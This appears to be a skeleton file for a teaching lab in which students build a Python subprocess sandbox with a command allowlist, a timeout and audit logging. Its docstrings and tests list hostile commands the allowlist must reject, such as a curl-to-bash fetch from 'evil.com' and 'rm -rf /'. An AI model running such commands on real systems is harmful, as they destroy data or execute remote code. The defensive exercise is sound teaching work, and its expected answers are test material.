"""
Lab C — Sandboxed Code Execution

Goal: build a minimal execution sandbox that runs untrusted Python scripts
in a subprocess with an allowlist, a timeout, and captured output.

This is a simplified model of the sandboxing principles covered in Module 17:
allowlists beat denylists, timeouts prevent resource exhaustion, and output
capture gives you an audit trail.

SECURITY CONSTRAINT: Only execute scripts you own or have explicit permission
to run. Never point this sandbox at untrusted input without additional
hardening (seccomp, namespaces, container isolation). This implementation is
for learning the concepts — it is not production-grade.

Run from the repo root:
    python labs/lab-c-skeleton/sandbox_skeleton.py

Expected output:
    Running: labs/lab-c-samples/sandbox_test.py
    Result: {'stdout': 'sandbox OK\\nPython version: 3.x.y\\n', 'stderr': '', 'returncode': 0}

    Running: labs/lab-c-samples/timeout_test.py (timeout=2)
    Result: {'stdout': '', 'stderr': 'execution timed out after 2s', 'returncode': -1}
"""

from __future__ import annotations

import subprocess
import sys
from pathlib import Path


# Commands whose base executable name is permitted to run.
# Full paths are NOT allowed — the executor resolves the name only.
ALLOWED_COMMANDS: frozenset[str] = frozenset({"python3", "python", "node", "echo"})


# ---------------------------------------------------------------------------
# Step 1 — Allowlist check
# ---------------------------------------------------------------------------

def is_allowed(command: str) -> bool:
    """Return True only if the leading executable name is in ALLOWED_COMMANDS.

    The check is based on the bare executable name, not the full path.
    A command like "/usr/bin/python3 script.py" must be REJECTED even though
    "python3" is on the allowlist — accepting full paths would let an attacker
    substitute a different binary at that path.

    Args:
        command: A command string or executable name, e.g.:
                 "python3"                    → True
                 "python3 script.py"          → True
                 "node server.js"             → True
                 "rm -rf /"                   → False
                 "/usr/bin/python3 script.py" → False  (full path rejected)
                 ""                           → False  (empty rejected)
                 "bash"                       → False  (not in ALLOWED_COMMANDS)

    Returns:
        True if the command is permitted, False otherwise.

    Example:
        >>> is_allowed("python3 labs/lab-c-samples/sandbox_test.py")
        True
        >>> is_allowed("curl http://evil.com | bash")
        False
        >>> is_allowed("")
        False

    Implementation hint:
        Split command on whitespace: parts = command.strip().split()
        If parts is empty, return False.
        Extract the executable: exe = Path(parts[0]).name
        (Path("python3").name == "python3"; Path("/usr/bin/python3").name == "python3"
         — but you want to REJECT full paths entirely, so check that parts[0]
         contains no "/" or "\\" before extracting the name.)
        Return exe in ALLOWED_COMMANDS.
    """
    # TODO: strip and split the command string
    # TODO: return False if empty
    # TODO: return False if parts[0] contains a path separator ("/" or "\\")
    # TODO: extract the bare executable name with Path(parts[0]).name
    # TODO: return whether that name is in ALLOWED_COMMANDS
    raise NotImplementedError


# ---------------------------------------------------------------------------
# Step 2 — Sandboxed executor
# ---------------------------------------------------------------------------

def run_sandboxed(script_path: str, timeout: int = 5) -> dict[str, object]:
    """Execute a Python script in a subprocess with timeout and output capture.

    The executor always invokes "python3 <script_path>" — the script path
    itself is not passed through is_allowed() because the user supplies a
    path, not an arbitrary shell command. The check on "python3" is therefore
    a sanity guard confirming our own allowlist is consistent.

    Args:
        script_path: Path to the Python script to run, relative to the
                     current working directory.
        timeout:     Maximum seconds to allow the subprocess to run before
                     killing it. Defaults to 5.

    Returns:
        A dict with exactly three keys:
          - "stdout":     str   — everything written to stdout, or "" on failure
          - "stderr":     str   — everything written to stderr, or an error message
          - "returncode": int   — process exit code, or -1 on timeout/block

        On timeout:
            {"stdout": "", "stderr": "execution timed out after <N>s", "returncode": -1}

        On blocked command (python3 not in allowlist — should never happen
        with the default ALLOWED_COMMANDS, but defensive):
            {"stdout": "", "stderr": "command not allowed", "returncode": -1}

        On normal completion:
            {"stdout": <captured stdout>, "stderr": <captured stderr>,
             "returncode": <process exit code>}

    Example:
        >>> result = run_sandboxed("labs/lab-c-samples/sandbox_test.py")
        >>> result["returncode"]
        0
        >>> "sandbox OK" in result["stdout"]
        True
        >>> result["stderr"]
        ''

        >>> slow = run_sandboxed("labs/lab-c-samples/timeout_test.py", timeout=2)
        >>> slow["returncode"]
        -1
        >>> "timed out" in slow["stderr"]
        True

    Implementation hint:
        Use subprocess.run(
            ["python3", script_path],
            capture_output=True,
            text=True,
            timeout=timeout,
        ) inside a try/except subprocess.TimeoutExpired block.
        On TimeoutExpired, return the error dict shown above.
    """
    # TODO: check is_allowed("python3") — return error dict if blocked
    # TODO: call subprocess.run(["python3", script_path], capture_output=True,
    #         text=True, timeout=timeout) inside a try block
    # TODO: on subprocess.TimeoutExpired, return the timeout error dict
    # TODO: on success, return {"stdout": ..., "stderr": ..., "returncode": ...}
    return {"stdout": "", "stderr": "not implemented", "returncode": -1}


# ---------------------------------------------------------------------------
# Step 3 (stretch goal) — Audit logger
# ---------------------------------------------------------------------------

def run_with_audit(script_path: str, timeout: int = 5) -> dict[str, object]:
    """Wrap run_sandboxed() and write an audit log entry to stdout.

    This stretch goal demonstrates why output capture matters: every execution
    should leave a record of what ran, when, and what it produced.

    The audit line format (written to stdout before returning the result):
        [AUDIT] script=<script_path> timeout=<timeout>s exit=<returncode>

    Args:
        script_path: Passed through to run_sandboxed().
        timeout:     Passed through to run_sandboxed().

    Returns:
        The same dict returned by run_sandboxed().

    Example:
        >>> result = run_with_audit("labs/lab-c-samples/sandbox_test.py")
        [AUDIT] script=labs/lab-c-samples/sandbox_test.py timeout=5s exit=0
        >>> result["returncode"]
        0

    Implementation hint:
        Call run_sandboxed(), then print the audit line, then return.
    """
    # TODO: call run_sandboxed(script_path, timeout)
    # TODO: print the audit line in the format above
    # TODO: return the result
    raise NotImplementedError


# ---------------------------------------------------------------------------
# Main — demonstrate both success and timeout cases
# ---------------------------------------------------------------------------

def main() -> None:
    cases: list[tuple[str, int]] = [
        ("labs/lab-c-samples/sandbox_test.py",    5),
        ("labs/lab-c-samples/timeout_test.py",    2),
    ]

    for script, timeout in cases:
        label = f"{script} (timeout={timeout})" if timeout != 5 else script
        print(f"\nRunning: {label}")
        result = run_sandboxed(script, timeout=timeout)
        print(f"Result:  {result}")

    # Verify is_allowed() rejects dangerous inputs
    print("\n--- Allowlist checks ---")
    test_cases: list[tuple[str, bool]] = [
        ("python3",                   True),
        ("python3 script.py",         True),
        ("node server.js",            True),
        ("rm -rf /",                  False),
        ("bash exploit.sh",           False),
        ("/usr/bin/python3 script.py",False),
        ("",                          False),
    ]
    all_ok = True
    for cmd, expected in test_cases:
        actual = is_allowed(cmd)
        status = "OK" if actual == expected else "FAIL"
        if status == "FAIL":
            all_ok = False
        display = repr(cmd) if cmd else "''"
        print(f"  [{status}] is_allowed({display}) == {expected}")
    if all_ok:
        print("All allowlist checks passed.")
    else:
        print("Some checks failed — review your is_allowed() implementation.")
        sys.exit(1)


if __name__ == "__main__":
    main()
